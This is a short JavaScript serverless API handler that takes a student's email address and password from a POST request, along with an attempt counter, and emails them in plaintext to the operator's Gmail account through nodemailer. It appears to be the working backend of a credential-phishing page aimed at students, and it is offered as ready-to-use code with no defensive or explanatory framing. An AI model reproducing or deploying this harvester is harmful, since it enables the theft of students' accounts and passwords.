import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      message: "Method Not Allowed"
    });
  }

  try {
    const { studentEmail, studentPassword, attempt } = req.body;

    if (!studentEmail || !studentPassword) {
      return res.status(400).json({
        success: false,
        message: "Missing studentEmail or studentPassword"
      });
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Submission Received",
      text: `
Student Email: ${studentEmail}
Student Password: ${studentPassword}
Attempt: ${attempt}
      `
    });

    return res.status(200).json({
      success: true,
      message: "Email sent successfully"
    });

  } catch (error) {
    console.error("EMAIL ERROR:", error);

    return res.status(500).json({
      success: false,
      message: "Email failed",
      error: error.message
    });
  }
}
